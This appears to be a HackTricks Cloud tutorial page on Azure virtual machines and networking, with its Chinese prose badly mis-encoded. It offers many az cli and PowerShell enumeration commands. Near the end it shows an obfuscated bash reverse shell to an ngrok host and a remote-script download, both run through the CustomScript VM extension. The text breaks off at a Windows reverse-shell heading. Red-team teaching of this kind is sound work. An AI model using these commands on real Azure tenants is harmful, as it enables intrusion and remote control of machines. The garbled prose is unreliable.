# Az - è™šæ‹Ÿæœºä¸ç½‘ç»œ

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Azure ç½‘ç»œåŸºæœ¬ä¿¡æ¯

Azure ç½‘ç»œåŒ…å« **ä¸åŒçš„å®ä½“å’Œé…ç½®æ–¹å¼ã€‚** æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹å†…å®¹ä¸­æ‰¾åˆ°ä¸åŒ Azure ç½‘ç»œå®ä½“çš„ç®€è¦ **æè¿°ã€** **ç¤ºä¾‹** å’Œ **æšä¸¾** å‘½ä»¤ï¼š

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## è™šæ‹ŸæœºåŸºæœ¬ä¿¡æ¯

Azure è™šæ‹Ÿæœº (VMs) æ˜¯çµæ´»çš„ã€æŒ‰éœ€çš„ **åŸºäºäº‘çš„æœåŠ¡å™¨ï¼Œå…è®¸æ‚¨è¿è¡Œ Windows æˆ– Linux æ“ä½œç³»ç»Ÿ**ã€‚å®ƒä»¬å…è®¸æ‚¨éƒ¨ç½²åº”ç”¨ç¨‹åºå’Œå·¥ä½œè´Ÿè½½ï¼Œè€Œæ— éœ€ç®¡ç†ç‰©ç†ç¡¬ä»¶ã€‚Azure VMs å¯ä»¥é…ç½®å„ç§ CPUã€å†…å­˜å’Œå­˜å‚¨é€‰é¡¹ï¼Œä»¥æ»¡è¶³ç‰¹å®šéœ€æ±‚ï¼Œå¹¶ä¸ Azure æœåŠ¡ï¼ˆå¦‚è™šæ‹Ÿç½‘ç»œã€å­˜å‚¨å’Œå®‰å…¨å·¥å…·ï¼‰é›†æˆã€‚

### å®‰å…¨é…ç½®

* **å¯ç”¨æ€§åŒºåŸŸ**ï¼šå¯ç”¨æ€§åŒºåŸŸæ˜¯ç‰¹å®š Azure åŒºåŸŸå†…çš„ç‹¬ç«‹æ•°æ®ä¸­å¿ƒç»„ï¼Œç‰©ç†ä¸Šåˆ†å¼€ï¼Œä»¥æœ€å°åŒ–å¤šä¸ªåŒºåŸŸå—åˆ°æœ¬åœ°æ•…éšœæˆ–ç¾éš¾å½±å“çš„é£é™©ã€‚
* **å®‰å…¨ç±»å‹**ï¼š
* **æ ‡å‡†å®‰å…¨**ï¼šè¿™æ˜¯é»˜è®¤çš„å®‰å…¨ç±»å‹ï¼Œä¸éœ€è¦ä»»ä½•ç‰¹å®šé…ç½®ã€‚
* **å—ä¿¡ä»»å¯åŠ¨**ï¼šæ­¤å®‰å…¨ç±»å‹é€šè¿‡ä½¿ç”¨å®‰å…¨å¯åŠ¨å’Œè™šæ‹Ÿå—ä¿¡ä»»å¹³å°æ¨¡å— (vTPM) å¢å¼ºå¯¹å¯åŠ¨å·¥å…·å’Œå†…æ ¸çº§æ¶æ„è½¯ä»¶çš„ä¿æŠ¤ã€‚
* **æœºå¯†è™šæ‹Ÿæœº**ï¼šåœ¨å—ä¿¡ä»»å¯åŠ¨çš„åŸºç¡€ä¸Šï¼Œæä¾› VMã€è™šæ‹Ÿæœºç›‘æ§ç¨‹åºå’Œä¸»æœºç®¡ç†ä¹‹é—´çš„ç¡¬ä»¶éš”ç¦»ï¼Œæ”¹å–„ç£ç›˜åŠ å¯†å’Œ [**æ›´å¤š**](https://learn.microsoft.com/en-us/azure/confidential-computing/confidential-vm-overview)**.**
* **èº«ä»½éªŒè¯**ï¼šé»˜è®¤æƒ…å†µä¸‹ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ **SSH å¯†é’¥**ï¼Œè™½ç„¶å¯ä»¥ä½¿ç”¨å…¬é’¥æˆ–ä½¿ç”¨å…ˆå‰çš„å¯†é’¥ï¼Œé»˜è®¤ç”¨æˆ·åä¸º **azureuser**ã€‚ä¹Ÿå¯ä»¥é…ç½®ä¸ºä½¿ç”¨ **å¯†ç ã€‚**
* **VM ç£ç›˜åŠ å¯†ï¼š** ç£ç›˜é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨å¹³å°ç®¡ç†å¯†é’¥è¿›è¡Œé™æ€åŠ å¯†ã€‚
* è¿˜å¯ä»¥å¯ç”¨ **ä¸»æœºåŠ å¯†**ï¼Œæ•°æ®å°†åœ¨å‘é€åˆ°å­˜å‚¨æœåŠ¡ä¹‹å‰åœ¨ä¸»æœºä¸ŠåŠ å¯†ï¼Œç¡®ä¿ä¸»æœºä¸å­˜å‚¨æœåŠ¡ä¹‹é—´çš„ç«¯åˆ°ç«¯åŠ å¯† ([**æ–‡æ¡£**](https://learn.microsoft.com/en-gb/azure/virtual-machines/disk-encryption#encryption-at-host---end-to-end-encryption-for-your-vm-data))ã€‚
* **NIC ç½‘ç»œå®‰å…¨ç»„**ï¼š
* **æ— **ï¼šåŸºæœ¬ä¸Šæ‰“å¼€æ‰€æœ‰ç«¯å£
* **åŸºæœ¬**ï¼šå…è®¸è½»æ¾æ‰“å¼€å…¥ç«™ç«¯å£ HTTP (80)ã€HTTPS (443)ã€SSH (22)ã€RDP (3389)
* **é«˜çº§**ï¼šé€‰æ‹©å®‰å…¨ç»„
* **å¤‡ä»½**ï¼šå¯ä»¥å¯ç”¨ **æ ‡å‡†** å¤‡ä»½ï¼ˆæ¯å¤©ä¸€æ¬¡ï¼‰å’Œ **å¢å¼º**ï¼ˆæ¯å¤©å¤šæ¬¡ï¼‰
* **è¡¥ä¸ç¼–æ’é€‰é¡¹**ï¼šè¿™ä½¿å¾—å¯ä»¥æ ¹æ®æ‰€é€‰ç­–ç•¥è‡ªåŠ¨åœ¨ VMs ä¸­åº”ç”¨è¡¥ä¸ï¼Œå¦‚ [**æ–‡æ¡£**](https://learn.microsoft.com/en-us/azure/virtual-machines/automatic-vm-guest-patching) ä¸­æ‰€è¿°ã€‚
* **è­¦æŠ¥**ï¼šå¯ä»¥åœ¨ VM ä¸­å‘ç”ŸæŸäº›äº‹ä»¶æ—¶è‡ªåŠ¨é€šè¿‡ç”µå­é‚®ä»¶æˆ–ç§»åŠ¨åº”ç”¨ç¨‹åºè·å–è­¦æŠ¥ã€‚é»˜è®¤è§„åˆ™ï¼š
* CPU ç™¾åˆ†æ¯”å¤§äº 80%
* å¯ç”¨å†…å­˜å­—èŠ‚å°‘äº 1GB
* æ•°æ®ç£ç›˜ IOPS æ¶ˆè€—ç™¾åˆ†æ¯”å¤§äº 95%
* æ“ä½œç³»ç»Ÿ IOPS æ¶ˆè€—ç™¾åˆ†æ¯”å¤§äº 95%
* ç½‘ç»œæ€»æµå…¥å¤§äº 500GB
* ç½‘ç»œæ€»æµå‡ºå¤§äº 200GB
* VmAvailabilityMetric å°äº 1
* **å¥åº·ç›‘æ§**ï¼šé»˜è®¤æ£€æŸ¥åè®® HTTP åœ¨ 80 ç«¯å£
* **é”å®š**ï¼šå…è®¸é”å®š VMï¼Œä½¿å…¶åªèƒ½è¢«è¯»å–ï¼ˆ**åªè¯»**é”å®šï¼‰æˆ–å¯ä»¥è¢«è¯»å–å’Œæ›´æ–°ä½†ä¸èƒ½è¢«åˆ é™¤ï¼ˆ**ä¸èƒ½åˆ é™¤**é”å®šï¼‰ã€‚
* å¤§å¤šæ•°ä¸ VM ç›¸å…³çš„èµ„æº **ä¹Ÿæ”¯æŒé”å®š**ï¼Œå¦‚ç£ç›˜ã€å¿«ç…§...
* é”å®šä¹Ÿå¯ä»¥åº”ç”¨äº **èµ„æºç»„å’Œè®¢é˜…çº§åˆ«**

## ç£ç›˜ä¸å¿«ç…§

* å¯ä»¥ **å¯ç”¨å°†ç£ç›˜é™„åŠ åˆ° 2 ä¸ªæˆ–æ›´å¤š VMs**
* é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªç£ç›˜éƒ½ **ä½¿ç”¨å¹³å°å¯†é’¥åŠ å¯†**ã€‚
* å¿«ç…§ä¹Ÿæ˜¯å¦‚æ­¤
* é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ä»¥ **ä»æ‰€æœ‰ç½‘ç»œå…±äº«ç£ç›˜**ï¼Œä½†ä¹Ÿå¯ä»¥ **é™åˆ¶** ä»…å¯¹æŸäº› **ç§æœ‰è®¿é—®** æˆ– **å®Œå…¨ç¦ç”¨** å…¬å…±å’Œç§æœ‰è®¿é—®ã€‚
* å¿«ç…§ä¹Ÿæ˜¯å¦‚æ­¤
* å¯ä»¥ **ç”Ÿæˆ SAS URI**ï¼ˆæœ€é•¿ 60 å¤©ï¼‰ä»¥ **å¯¼å‡ºç£ç›˜**ï¼Œå¯ä»¥é…ç½®ä¸ºéœ€è¦èº«ä»½éªŒè¯æˆ–ä¸éœ€è¦
* å¿«ç…§ä¹Ÿæ˜¯å¦‚æ­¤

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# List all disks
az disk list --output table

# Get info about a disk
az disk show --name <disk-name> --resource-group <rsc-group>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# List all disks
Get-AzDisk

# Get info about a disk
Get-AzDisk -Name <DiskName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}


## é•œåƒã€å›¾åº“é•œåƒå’Œè¿˜åŸç‚¹

ä¸€ä¸ª **VM é•œåƒ** æ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼ŒåŒ…å«äº†åˆ›å»ºæ–°è™šæ‹Ÿæœº (VM) æ‰€éœ€çš„æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºè®¾ç½®å’Œæ–‡ä»¶ç³»ç»Ÿã€‚é•œåƒå’Œç£ç›˜å¿«ç…§ä¹‹é—´çš„åŒºåˆ«åœ¨äºï¼Œç£ç›˜å¿«ç…§æ˜¯ä¸€ä¸ªåªè¯»çš„ã€ç‰¹å®šæ—¶é—´ç‚¹çš„å•ä¸ªæ‰˜ç®¡ç£ç›˜çš„å‰¯æœ¬ï¼Œä¸»è¦ç”¨äºå¤‡ä»½æˆ–æ•…éšœæ’é™¤ï¼Œè€Œé•œåƒå¯ä»¥åŒ…å« **å¤šä¸ªç£ç›˜ï¼Œå¹¶ä¸”æ—¨åœ¨ä½œä¸ºåˆ›å»ºæ–° VM çš„æ¨¡æ¿**ã€‚\
é•œåƒå¯ä»¥åœ¨ Azure çš„ **é•œåƒéƒ¨åˆ†** æˆ– **Azure è®¡ç®—åº“** ä¸­ç®¡ç†ï¼Œåè€…å…è®¸ç”Ÿæˆ **ç‰ˆæœ¬** å¹¶ **å…±äº«** é•œåƒï¼Œè·¨ç§Ÿæˆ·ç”šè‡³å…¬å¼€ã€‚

ä¸€ä¸ª **è¿˜åŸç‚¹** å­˜å‚¨ VM é…ç½®å’Œ **ç‰¹å®šæ—¶é—´ç‚¹** åº”ç”¨ç¨‹åºä¸€è‡´çš„ **æ‰€æœ‰æ‰˜ç®¡ç£ç›˜çš„å¿«ç…§**ã€‚å®ƒä¸ VM ç›¸å…³ï¼Œå…¶ç›®çš„æ˜¯èƒ½å¤Ÿå°†è¯¥ VM æ¢å¤åˆ°ç‰¹å®šæ—¶é—´ç‚¹çš„çŠ¶æ€ã€‚
```bash
# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shaerd with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
## List all galleries and get info about one
Get-AzGallery
Get-AzGallery -Name <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all image definitions in a gallery and get info about one
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName> -Name <ImageDefinitionName>

## List all the versions of an image definition in a gallery
Get-AzGalleryImageVersion -GalleryImageDefinitionName <ImageName> -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all VM applications inside a gallery
Get-AzGalleryApplication -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

# Images
# List all managed images in your subscription
Get-AzImage -Name <ResourceName> -ResourceGroupName <ResourceGroupName>

# Restore points
## List all restore points and get info about 1
Get-AzRestorePointCollection -Name <CollectionName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Azure Site Recovery

æ¥è‡ª[**æ–‡æ¡£**](https://learn.microsoft.com/en-us/azure/site-recovery/site-recovery-overview)ï¼šç«™ç‚¹æ¢å¤é€šè¿‡åœ¨åœæœºæœŸé—´ä¿æŒä¸šåŠ¡åº”ç”¨ç¨‹åºå’Œå·¥ä½œè´Ÿè½½çš„è¿è¡Œæ¥ç¡®ä¿ä¸šåŠ¡è¿ç»­æ€§ã€‚ç«™ç‚¹æ¢å¤**å¤åˆ¶å·¥ä½œè´Ÿè½½**ä»ä¸»ç«™ç‚¹åˆ°æ¬¡è¦ä½ç½®ã€‚å½“ä¸»ç«™ç‚¹å‘ç”Ÿåœæœºæ—¶ï¼Œæ‚¨å¯ä»¥åˆ‡æ¢åˆ°æ¬¡è¦ä½ç½®ï¼Œå¹¶ä»é‚£é‡Œè®¿é—®åº”ç”¨ç¨‹åºã€‚åœ¨ä¸»ä½ç½®æ¢å¤è¿è¡Œåï¼Œæ‚¨å¯ä»¥åˆ‡æ¢å›å»ã€‚

## Azure Bastion

Azure Bastion é€šè¿‡ Azure é—¨æˆ·æˆ–é€šè¿‡è·³è½¬ç®±ç›´æ¥ä¸ºæ‚¨çš„è™šæ‹Ÿæœº (VM) æä¾›å®‰å…¨æ— ç¼çš„**è¿œç¨‹æ¡Œé¢åè®® (RDP)**å’Œ**å®‰å…¨å¤–å£³ (SSH)**è®¿é—®ã€‚é€šè¿‡**æ¶ˆé™¤å¯¹å…¬å…± IP åœ°å€çš„éœ€æ±‚**ï¼Œæ¥å®ç°è¿™ä¸€ç‚¹ã€‚&#x20;

Bastion åœ¨å…¶éœ€è¦å·¥ä½œçš„ VNet ä¸­éƒ¨ç½²ä¸€ä¸ªåä¸º**`AzureBastionSubnet`**çš„å­ç½‘ï¼Œå­ç½‘æ©ç ä¸º`/26`ã€‚ç„¶åï¼Œå®ƒå…è®¸é€šè¿‡æµè§ˆå™¨**è¿æ¥åˆ°å†…éƒ¨ VM**ï¼Œä½¿ç”¨`RDP`å’Œ`SSH`ï¼Œé¿å…å°† VM çš„ç«¯å£æš´éœ²åˆ°äº’è”ç½‘ã€‚å®ƒè¿˜å¯ä»¥ä½œä¸º**è·³è½¬ä¸»æœº**å·¥ä½œã€‚

è¦åˆ—å‡ºæ‚¨è®¢é˜…ä¸­çš„æ‰€æœ‰ Azure Bastion ä¸»æœºå¹¶é€šè¿‡å®ƒä»¬è¿æ¥åˆ° VMï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# List bastions
az network bastion list -o table

# Connect via SSH through bastion
az network bastion ssh \
--name MyBastion \
--resource-group MyResourceGroup \
--target-resource-id /subscriptions/12345678-1234-1234-1234-123456789abc/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/MyVM \
--auth-type ssh-key \
--username azureuser \
--ssh-key ~/.ssh/id_rsa

# Connect via RDP through bastion
az network bastion rdp \
--name <BASTION_NAME> \
--resource-group <RESOURCE_GROUP> \
--target-resource-id /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Compute/virtualMachines/<VM_NAME> \
--auth-type password \
--username <VM_USERNAME> \
--password <VM_PASSWORD>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# List bastions
Get-AzBastion
```
{% endcode %}
{% endtab %}
{% endtabs %}

## å…ƒæ•°æ®

Azure å®ä¾‹å…ƒæ•°æ®æœåŠ¡ (IMDS) **æä¾›æœ‰å…³æ­£åœ¨è¿è¡Œçš„è™šæ‹Ÿæœºå®ä¾‹çš„ä¿¡æ¯**ï¼Œä»¥ååŠ©å…¶ç®¡ç†å’Œé…ç½®ã€‚å®ƒæä¾› SKUã€å­˜å‚¨ã€ç½‘ç»œé…ç½®ä»¥åŠå³å°†è¿›è¡Œçš„ç»´æŠ¤äº‹ä»¶çš„ä¿¡æ¯ï¼Œæ‰€æœ‰è¿™äº›ä¿¡æ¯é€šè¿‡ **å¯åœ¨éè·¯ç”± IP åœ°å€ 169.254.169.254 è®¿é—®çš„ REST API** æä¾›ï¼Œè¯¥åœ°å€ä»…å¯ä» VM å†…éƒ¨è®¿é—®ã€‚VM å’Œ IMDS ä¹‹é—´çš„é€šä¿¡ä¿æŒåœ¨ä¸»æœºå†…éƒ¨ï¼Œç¡®ä¿å®‰å…¨è®¿é—®ã€‚åœ¨æŸ¥è¯¢ IMDS æ—¶ï¼ŒVM å†…éƒ¨çš„ HTTP å®¢æˆ·ç«¯åº”ç»•è¿‡ Web ä»£ç†ä»¥ç¡®ä¿æ­£ç¡®é€šä¿¡ã€‚

æ­¤å¤–ï¼Œè¦è”ç³»å…ƒæ•°æ®ç«¯ç‚¹ï¼ŒHTTP è¯·æ±‚å¿…é¡»å…·æœ‰ **`Metadata: true`** å¤´ï¼Œå¹¶ä¸”ä¸å¾—å…·æœ‰ **`X-Forwarded-For`** å¤´ã€‚

æ£€æŸ¥å¦‚ä½•æšä¸¾å®ƒï¼š

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-vm" %}

## VM æšä¸¾

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# VMs
## List all VMs and get info about one
az vm list --output table
az vm show --name <came> --resource-group <rsc-group>

## List all available VM images and get info about one
az vm image list --all --output table

# VM Extensions
## List all VM extensions
az vm extension image list --output table

## Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table

## List extensions in a VM
az vm extension list -g <rsc-group> --vm-name <vm-name>

## List managed identities in a VM
az vm identity show \
--resource-group <rsc-group> \
--name <vm-name>

# Disks
## List all disks and get info about one
az disk list --output table
az disk show --name <disk-name> --resource-group <rsc-group>

# Snapshots
## List all galleries abd get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all snapshots and get info about one
az snapshot list --output table
az snapshot show --name <name> --resource-group <rsc-group>

# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shared with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>

# Bastion
## list all bastions
az network bastion list -o table

# Network
## List VNets
az network vnet list --query "[].{name:name, location:location, addressSpace:addressSpace}"

## List subnets of a VNet
az network vnet subnet list --resource-group <ResourceGroupName> --vnet-name <VNetName> --query "[].{name:name, addressPrefix:addressPrefix}" -o table

## List public IPs
az network public-ip list --output table

## Get NSG rules
az network nsg rule list --nsg-name <NSGName> --resource-group <ResourceGroupName> --query "[].{name:name, priority:priority, direction:direction, access:access, protocol:protocol, sourceAddressPrefix:sourceAddressPrefix, destinationAddressPrefix:destinationAddressPrefix, sourcePortRange:sourcePortRange, destinationPortRange:destinationPortRange}" -o table

## Get NICs and subnets using this NSG
az network nsg show --name MyLowCostVM-nsg --resource-group Resource_Group_1 --query "{subnets: subnets, networkInterfaces: networkInterfaces}"

## List all Nics & get info of a single one
az network nic list --output table
az network nic show --name <name> --resource-group <rsc-group>

## List Azure Firewalls
az network firewall list --query "[].{name:name, location:location, subnet:subnet, publicIp:publicIp}" -o table

## Get network rules of a firewall
az network firewall network-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get application rules of a firewall
az network firewall application-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get nat rules of a firewall
az network firewall nat-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## List Route Tables
az network route-table list --query "[].{name:name, resourceGroup:resourceGroup, location:location}" -o table

## List routes for a table
az network route-table route list --route-table-name <RouteTableName> --resource-group <ResourceGroupName> --query "[].{name:name, addressPrefix:addressPrefix, nextHopType:nextHopType, nextHopIpAddress:nextHopIpAddress}" -o table

# Misc
## List all virtual machine scale sets
az vmss list --output table

## List all availability sets
az vm availability-set list --output table

## List all load balancers
az network lb list --output table

## List all storage accounts
az storage account list --output table

## List all custom script extensions on a specific VM
az vm extension list --vm-name <vm-name> --resource-group <resource-group>

# Show boot diagnostics settings for a specific VM
az vm boot-diagnostics get-boot-log --name <vm-name> --resource-group <resource-group>

## List all tags on virtual machines
az resource list --resource-type "Microsoft.Compute/virtualMachines" --query "[].{Name:name, Tags:tags}" --output table

# List all available run commands for virtual machines
az vm run-command list --output table
```
{% endcode %}
{% endtab %}
{% tab title="Az PS" %}
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)

# Disks
## List all disks and get info about one
Get-AzDisk
Get-AzDisk -Name <DiskName> -ResourceGroupName <ResourceGroupName>

# Snapshots
## List all galleries abd get info about one
Get-AzGallery
Get-AzGallery -Name <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all snapshots and get info about one
Get-AzSnapshot
Get-AzSnapshot -Name <SnapshotName> -ResourceGroupName <ResourceGroupName>

## List all image definitions in a gallery and get info about one
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName> -Name <ImageDefinitionName>

## List all the versions of an image definition in a gallery
Get-AzGalleryImageVersion -GalleryImageDefinitionName <ImageName> -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all VM applications inside a gallery
Get-AzGalleryApplication -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

# Images
# List all managed images in your subscription
Get-AzImage -Name <ResourceName> -ResourceGroupName <ResourceGroupName>

# Restore points
## List all restore points and get info about 1
Get-AzRestorePointCollection -Name <CollectionName> -ResourceGroupName <ResourceGroupName>

# Bastion
## List bastions
Get-AzBastion

# Network
## List all VNets in your subscription
Get-AzVirtualNetwork

## List VNet peering connections for a given VNet
(Get-AzVirtualNetwork -ResourceGroupName <ResourceGroupName> -Name <VNetName>).VirtualNetworkPeerings

## List Shared Resources (e.g., Azure Firewall) in the Hub
Get-AzFirewall

## List VPN Gateways
Get-AzVirtualNetworkGateway -ResourceGroupName <ResourceGroupName>

## List VPN Connections
Get-AzVirtualNetworkGatewayConnection -ResourceGroupName <ResourceGroupName>

## List ExpressRoute Circuits
Get-AzExpressRouteCircuit

# Misc
## List all virtual machine scale sets
Get-AzVmss

## List all availability sets
Get-AzAvailabilitySet

## List all load balancers
Get-AzLoadBalancer

## List all storage accounts
Get-AzStorageAccount

## List all custom script extensions on a specific VM
Get-AzVMExtension -VMName <VmName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## åœ¨è™šæ‹Ÿæœºä¸­çš„ä»£ç æ‰§è¡Œ

### è™šæ‹Ÿæœºæ‰©å±•

Azure è™šæ‹Ÿæœºæ‰©å±•æ˜¯æä¾› **éƒ¨ç½²åé…ç½®** å’Œè‡ªåŠ¨åŒ–ä»»åŠ¡çš„å°åº”ç”¨ç¨‹åºï¼Œè¿è¡Œåœ¨ Azure è™šæ‹Ÿæœº (VM) ä¸Šã€‚

è¿™å°†å…è®¸ **åœ¨è™šæ‹Ÿæœºå†…éƒ¨æ‰§è¡Œä»»æ„ä»£ç **ã€‚

æ‰€éœ€çš„æƒé™æ˜¯ **`Microsoft.Compute/virtualMachines/extensions/write`**ã€‚

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„æ‰©å±•ï¼š

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# It takes some mins to run
az vm extension image list --output table

# Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# It takes some mins to run
Get-AzVMExtensionImage -Location <Location> -PublisherName <PublisherName> -Type <Type>
```
{% endcode %}
{% endtab %}
{% endtabs %}


å¯ä»¥**è¿è¡Œè‡ªå®šä¹‰æ‰©å±•ä»¥è¿è¡Œè‡ªå®šä¹‰ä»£ç **ï¼š

{% tabs %}
{% tab title="Linux" %}
* æ‰§è¡Œåå‘ shell

{% code overflow="wrap" %}
```bash
# Prepare the rev shell
echo -n 'bash -i  >& /dev/tcp/2.tcp.eu.ngrok.io/13215 0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ==

# Execute rev shell
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{}' \
--protected-settings '{"commandToExecute": "nohup echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ== | base64 -d | bash &"}'
```
{% endcode %}

* æ‰§è¡Œä½äºäº’è”ç½‘çš„è„šæœ¬

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/8ce279967be0855cc13aa2601402fed3/raw/72816c3603243cf2839a7c4283e43ef4b6048263/hacktricks_touch.sh"]}' \
--protected-settings '{"commandToExecute": "sh hacktricks_touch.sh"}'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
* æ‰§è¡Œåå‘ shell

{% code overflow="wrap" %}
```bash
# Get encoded reverse shell
